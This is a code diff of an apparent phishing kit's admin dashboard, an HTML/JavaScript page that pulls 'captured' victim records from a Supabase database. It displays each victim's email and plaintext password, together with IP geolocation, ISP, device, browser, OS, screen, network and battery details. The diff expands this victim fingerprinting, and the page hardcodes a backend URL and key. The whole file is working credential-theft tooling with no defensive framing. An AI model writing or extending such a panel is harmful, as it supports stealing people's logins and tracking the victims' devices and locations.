@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Captured Data</title>
+    <title>Admin Panel - Detailed View</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * {
@@ -93,7 +93,7 @@
         table {
             width: 100%;
             border-collapse: collapse;
-            min-width: 1200px;
+            min-width: 1400px;
         }
 
         th {
@@ -138,7 +138,7 @@
         }
 
         .view-btn {
-            background: #4CAF50;
+            background: #2196F3;
             color: white;
             border: none;
             padding: 5px 10px;
@@ -149,7 +149,7 @@
         }
 
         .view-btn:hover {
-            background: #45a049;
+            background: #1976D2;
         }
 
         .empty-state {
@@ -172,7 +172,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.7);
             z-index: 1000;
             align-items: center;
             justify-content: center;
@@ -182,27 +182,24 @@
             background: white;
             border-radius: 10px;
             padding: 30px;
-            max-width: 500px;
-            width: 90%;
+            max-width: 800px;
+            width: 95%;
             box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            max-height: 80vh;
+            max-height: 90vh;
             overflow-y: auto;
         }
 
         .modal h3 {
-            margin-bottom: 15px;
-            color: #333;
-        }
-
-        .modal p {
             margin-bottom: 20px;
-            color: #666;
+            color: #333;
+            font-size: 24px;
         }
 
         .modal-buttons {
             display: flex;
             gap: 10px;
             justify-content: flex-end;
+            margin-top: 20px;
         }
 
         .modal-btn {
@@ -235,34 +232,48 @@
         .details-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 10px;
+            gap: 15px;
             margin-bottom: 20px;
         }
 
-        .detail-item {
-            padding: 10px;
+        .detail-section {
             background: #f8f9fa;
-            border-radius: 5px;
+            padding: 15px;
+            border-radius: 8px;
+        }
+
+        .detail-section h4 {
+            color: #667eea;
+            margin-bottom: 10px;
+            font-size: 16px;
+            border-bottom: 2px solid #667eea;
+            padding-bottom: 5px;
+        }
+
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 14px;
         }
 
         .detail-label {
             font-weight: 600;
             color: #666;
-            font-size: 12px;
-            margin-bottom: 5px;
         }
 
         .detail-value {
             color: #333;
-            font-size: 14px;
+            text-align: right;
             word-break: break-word;
+            max-width: 60%;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>📊 Captured Credentials</h1>
+            <h1>📊 Detailed Captured Data</h1>
             <div>
                 <button class="btn refresh-btn" onclick="loadData()">🔄 Refresh Data</button>
             </div>
@@ -294,39 +305,30 @@
                         <th>#</th>
                         <th>Email</th>
                         <th>Password</th>
-                        <th>IP Address</th>
+                        <th>IP</th>
                         <th>Location</th>
+                        <th>Device</th>
                         <th>Browser</th>
                         <th>OS</th>
-                        <th>Timestamp</th>
+                        <th>Network</th>
+                        <th>Battery</th>
+                        <th>Time</th>
                         <th>Actions</th>
                     </tr>
                 </thead>
                 <tbody id="tableBody">
                     <tr>
-                        <td colspan="9" style="text-align:center;">Loading data...</td>
+                        <td colspan="12" style="text-align:center;">Loading data...</td>
                     </tr>
                 </tbody>
             </table>
         </div>
     </div>
 
-    <!-- Delete Confirmation Modal -->
-    <div class="modal-overlay" id="deleteModal">
-        <div class="modal">
-            <h3>Confirm Deletion</h3>
-            <p id="deleteMessage">Are you sure you want to delete this entry?</p>
-            <div class="modal-buttons">
-                <button class="modal-btn cancel-btn" onclick="closeDeleteModal()">Cancel</button>
-                <button class="modal-btn confirm-btn" onclick="confirmDelete()">Delete</button>
-            </div>
-        </div>
-    </div>
-
     <!-- View Details Modal -->
     <div class="modal-overlay" id="viewModal">
         <div class="modal">
-            <h3>📋 Full Details</h3>
+            <h3>📋 Full Device Details</h3>
             <div id="detailsContent"></div>
             <div class="modal-buttons">
                 <button class="modal-btn cancel-btn" onclick="closeViewModal()">Close</button>
@@ -334,20 +336,29 @@
         </div>
     </div>
 
+    <!-- Delete Confirmation Modal -->
+    <div class="modal-overlay" id="deleteModal">
+        <div class="modal">
+            <h3>Confirm Deletion</h3>
+            <p>Are you sure you want to delete this entry?</p>
+            <div class="modal-buttons">
+                <button class="modal-btn cancel-btn" onclick="closeDeleteModal()">Cancel</button>
+                <button class="modal-btn confirm-btn" onclick="confirmDelete()">Delete</button>
+            </div>
+        </div>
+    </div>
+
     <script>
-        // Supabase configuration
         const supabaseUrl = 'https://aqynejlgjwdmxsekuyld.supabase.co';
         const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
         
-        // Initialize Supabase
         const db = window.supabase.createClient(supabaseUrl, supabaseKey);
         
         let deleteId = null;
         let currentData = [];
         
-        // Make loadData globally accessible
         window.loadData = async function() {
-            console.log('Loading data from Supabase...');
+            console.log('Loading data...');
             
             try {
                 const { data, error } = await db
@@ -357,49 +368,48 @@
                     .limit(100);
                 
                 if (error) {
-                    console.error('Error loading data:', error);
+                    console.error('Error:', error);
                     document.getElementById('tableBody').innerHTML = 
-                        `<tr><td colspan="9" class="error-state">Error: ${error.message}</td></tr>`;
+                        `<tr><td colspan="12" class="error-state">Error: ${error.message}</td></tr>`;
                     return;
                 }
                 
                 currentData = data;
-                console.log('Data loaded:', data.length, 'records');
                 
                 document.getElementById('totalCount').textContent = data.length;
                 
-                // Count today's captures
                 const today = new Date().toDateString();
                 const todayCount = data.filter(item => 
                     new Date(item.created_at).toDateString() === today
                 ).length;
                 document.getElementById('todayCount').textContent = todayCount;
                 
-                // Count unique IPs
-                const uniqueIPs = new Set(data.map(item => item.ip_address).filter(Boolean));
+                const uniqueIPs = new Set(data.map(item => item.ip_address).filter(ip => ip !== '0.0.0.0'));
                 document.getElementById('uniqueIPs').textContent = uniqueIPs.size;
                 
-                // Count unique countries
                 const uniqueCountries = new Set(data.map(item => 
                     item.ip_details?.country || 'Unknown'
-                ).filter(Boolean));
+                ).filter(c => c !== 'Unknown'));
                 document.getElementById('uniqueCountries').textContent = uniqueCountries.size;
                 
                 const tableBody = document.getElementById('tableBody');
                 
                 if (data.length === 0) {
-                    tableBody.innerHTML = '<tr><td colspan="9" class="empty-state">No data captured yet</td></tr>';
+                    tableBody.innerHTML = '<tr><td colspan="12" class="empty-state">No data captured yet</td></tr>';
                     return;
                 }
                 
                 tableBody.innerHTML = data.map((item, index) => {
+                    const device = item.device_info || {};
                     const ipDetails = item.ip_details || {};
-                    const deviceInfo = item.device_info || {};
                     const location = ipDetails.city && ipDetails.country 
                         ? `${ipDetails.city}, ${ipDetails.country}`
-                        : 'N/A';
-                    const browser = deviceInfo.browser?.name || 'N/A';
-                    const os = deviceInfo.browser?.os || 'N/A';
+                        : 'Unknown';
+                    const deviceType = device.device?.type || 'Unknown';
+                    const browserName = device.browser?.name || 'Unknown';
+                    const osName = device.os?.name || 'Unknown';
+                    const networkType = device.network?.type || 'Unknown';
+                    const batteryLevel = device.battery?.percentage || 'Unknown';
                     
                     return `
                     <tr>
@@ -408,8 +418,11 @@
                         <td class="password">${item.password || 'N/A'}</td>
                         <td>${item.ip_address || 'N/A'}</td>
                         <td>${location}</td>
-                        <td>${browser}</td>
-                        <td>${os}</td>
+                        <td>${deviceType}</td>
+                        <td>${browserName}</td>
+                        <td>${osName}</td>
+                        <td>${networkType}</td>
+                        <td>${batteryLevel}</td>
                         <td>${new Date(item.created_at).toLocaleString()}</td>
                         <td>
                             <button class="view-btn" onclick="showDetails(${index})">View</button>
@@ -422,102 +435,157 @@
             } catch (err) {
                 console.error('Error:', err);
                 document.getElementById('tableBody').innerHTML = 
-                    `<tr><td colspan="9" class="error-state">Connection error: ${err.message}</td></tr>`;
+                    `<tr><td colspan="12" class="error-state">Connection error: ${err.message}</td></tr>`;
             }
         };
         
-        // Show details modal
         window.showDetails = function(index) {
             const item = currentData[index];
             if (!item) return;
             
-            const deviceInfo = item.device_info || {};
+            const device = item.device_info || {};
             const ipDetails = item.ip_details || {};
-            const fingerprint = item.fingerprint_data || {};
-            const battery = item.battery_info || {};
-            const network = item.network_info || {};
             
             const detailsHTML = `
                 <div class="details-grid">
-                    <div class="detail-item">
-                        <div class="detail-label">Email</div>
-                        <div class="detail-value">${item.email || 'N/A'}</div>
+                    <div class="detail-section">
+                        <h4>🔑 Credentials</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">Email:</span>
+                            <span class="detail-value">${item.email || 'N/A'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Password:</span>
+                            <span class="detail-value">${item.password || 'N/A'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">IP Address:</span>
+                            <span class="detail-value">${item.ip_address || 'N/A'}</span>
+                        </div>
                     </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Password</div>
-                        <div class="detail-value">${item.password || 'N/A'}</div>
+                    
+                    <div class="detail-section">
+                        <h4>📍 Location</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">City:</span>
+                            <span class="detail-value">${ipDetails.city || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Country:</span>
+                            <span class="detail-value">${ipDetails.country || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Region:</span>
+                            <span class="detail-value">${ipDetails.region || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">ISP:</span>
+                            <span class="detail-value">${ipDetails.isp || 'Unknown'}</span>
+                        </div>
                     </div>
-                    <div class="detail-item">
-                        <div class="detail-label">IP Address</div>
-                        <div class="detail-value">${item.ip_address || 'N/A'}</div>
+                    
+                    <div class="detail-section">
+                        <h4>💻 Browser</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">Name:</span>
+                            <span class="detail-value">${device.browser?.name || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Version:</span>
+                            <span class="detail-value">${device.browser?.version || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Engine:</span>
+                            <span class="detail-value">${device.browser?.engine || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Mobile:</span>
+                            <span class="detail-value">${device.browser?.isMobile ? 'Yes' : 'No'}</span>
+                        </div>
                     </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Location</div>
-                        <div class="detail-value">${ipDetails.city || 'N/A'}, ${ipDetails.country || 'N/A'}</div>
+                    
+                    <div class="detail-section">
+                        <h4>🖥️ Operating System</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">Name:</span>
+                            <span class="detail-value">${device.os?.name || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Version:</span>
+                            <span class="detail-value">${device.os?.version || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Architecture:</span>
+                            <span class="detail-value">${device.os?.architecture || 'Unknown'}</span>
+                        </div>
                     </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Region</div>
-                        <div class="detail-value">${ipDetails.region || 'N/A'}</div>
+                    
+                    <div class="detail-section">
+                        <h4>📱 Device</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">Type:</span>
+                            <span class="detail-value">${device.device?.type || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Brand:</span>
+                            <span class="detail-value">${device.device?.brand || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Model:</span>
+                            <span class="detail-value">${device.device?.model || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Touch Device:</span>
+                            <span class="detail-value">${device.device?.isTouchDevice ? 'Yes' : 'No'}</span>
+                        </div>
                     </div>
-                    <div class="detail-item">
-                        <div class="detail-label">ISP</div>
-                        <div class="detail-value">${ipDetails.org || 'N/A'}</div>
+                    
+                    <div class="detail-section">
+                        <h4>🖥️ Screen</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">Resolution:</span>
+                            <span class="detail-value">${device.screen?.width}x${device.screen?.height}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Available:</span>
+                            <span class="detail-value">${device.screen?.availWidth}x${device.screen?.availHeight}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Color Depth:</span>
+                            <span class="detail-value">${device.screen?.colorDepth}-bit</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Pixel Ratio:</span>
+                            <span class="detail-value">${device.screen?.pixelRatio}</span>
+                        </div>
                     </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Browser</div>
-                        <div class="detail-value">${deviceInfo.browser?.name || 'N/A'} ${deviceInfo.browser?.version || ''}</div>
+                    
+                    <div class="detail-section">
+                        <h4>🌐 Network</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">Type:</span>
+                            <span class="detail-value">${device.network?.type || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Speed:</span>
+                            <span class="detail-value">${device.network?.downlink || 'Unknown'} Mbps</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">RTT:</span>
+                            <span class="detail-value">${device.network?.rtt || 'Unknown'} ms</span>
+                        </div>
                     </div>
-                    <div class="detail-item">
-                        <div class="detail-label">OS</div>
-                        <div class="detail-value">${deviceInfo.browser?.os || 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Screen Resolution</div>
-                        <div class="detail-value">${deviceInfo.screenResolution || 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Color Depth</div>
-                        <div class="detail-value">${deviceInfo.colorDepth || 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">CPU Cores</div>
-                        <div class="detail-value">${deviceInfo.hardwareConcurrency || 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Device Memory</div>
-                        <div class="detail-value">${deviceInfo.deviceMemory || 'N/A'} GB</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Timezone</div>
-                        <div class="detail-value">${deviceInfo.timezone || 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Language</div>
-                        <div class="detail-value">${deviceInfo.language || 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Battery Level</div>
-                        <div class="detail-value">${battery.level ? (battery.level * 100).toFixed(0) + '%' : 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Charging</div>
-                        <div class="detail-value">${battery.charging !== undefined ? (battery.charging ? 'Yes' : 'No') : 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Network Type</div>
-                        <div class="detail-value">${network?.effectiveType || 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Connection Speed</div>
-                        <div class="detail-value">${network?.downlink || 'N/A'} Mbps</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">Referrer</div>
-                        <div class="detail-value">${item.referer || 'N/A'}</div>
-                    </div>
-                    <div class="detail-item">
-                        <div class="detail-label">User Agent</div>
-                        <div class="detail-value">${item.user_agent || 'N/A'}</div>
+                    
+                    <div class="detail-section">
+                        <h4>🔋 Battery</h4>
+                        <div class="detail-item">
+                            <span class="detail-label">Level:</span>
+                            <span class="detail-value">${device.battery?.percentage || 'Unknown'}</span>
+                        </div>
+                        <div class="detail-item">
+                            <span class="detail-label">Charging:</span>
+                            <span class="detail-value">${device.battery?.charging ? 'Yes' : 'No'}</span>
+                        </div>
                     </div>
                 </div>
             `;
@@ -526,25 +594,20 @@
             document.getElementById('viewModal').style.display = 'flex';
         };
         
-        // Close view modal
         window.closeViewModal = function() {
             document.getElementById('viewModal').style.display = 'none';
         };
         
-        // Show delete confirmation modal
         window.showDeleteModal = function(id) {
             deleteId = id;
-            document.getElementById('deleteMessage').textContent = 'Are you sure you want to delete this entry?';
             document.getElementById('deleteModal').style.display = 'flex';
         };
         
-        // Close delete modal
         window.closeDeleteModal = function() {
             deleteId = null;
             document.getElementById('deleteModal').style.display = 'none';
         };
         
-        // Confirm delete
         window.confirmDelete = async function() {
             if (!deleteId) return;
             
@@ -554,40 +617,25 @@
                     .delete()
                     .eq('id', deleteId);
                 
-                if (error) {
-                    console.error('Error deleting:', error);
-                    alert('Error deleting entry: ' + error.message);
-                } else {
-                    console.log('✅ Entry deleted successfully');
-                    closeDeleteModal();
-                    loadData();
-                }
+                if (error) throw error;
+                
+                closeDeleteModal();
+                loadData();
             } catch (err) {
-                console.error('Error:', err);
+                console.error('Error deleting:', err);
                 alert('Error deleting entry');
             }
         };
         
-        // Close modals if clicking outside
-        document.getElementById('deleteModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                closeDeleteModal();
-            }
-        });
-        
         document.getElementById('viewModal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                closeViewModal();
-            }
+            if (e.target === this) closeViewModal();
         });
         
-        // Load data when page loads
-        window.addEventListener('DOMContentLoaded', function() {
-            console.log('Admin panel loaded');
-            loadData();
+        document.getElementById('deleteModal').addEventListener('click', function(e) {
+            if (e.target === this) closeDeleteModal();
         });
         
-        // Auto-refresh every 30 seconds
+        window.addEventListener('DOMContentLoaded', loadData);
         setInterval(loadData, 30000);
     </script>
 </body>
